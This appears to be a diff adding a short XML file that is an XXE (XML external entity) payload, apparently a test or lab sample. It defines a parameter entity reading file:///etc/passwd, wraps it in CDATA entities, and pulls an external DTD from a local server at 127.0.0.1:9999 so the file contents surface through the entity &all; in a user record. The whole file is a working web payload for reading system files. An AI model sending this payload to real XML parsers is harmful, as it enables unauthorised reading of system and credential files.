@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+        <!ELEMENT data (ANY)>
+        <!ENTITY % start "<![CDATA[">
+    <!ENTITY % goodies SYSTEM "file:///etc/passwd">
+    <!ENTITY % end "]]>">
+                <!ENTITY % dtd SYSTEM "http://127.0.0.1:9999/bypass.dtd">
+        %dtd;
+        ]>
+<user>
+    <name>pwn2own</name>
+    <sex>&all;</sex>
+    <age>18</age>
+</user>
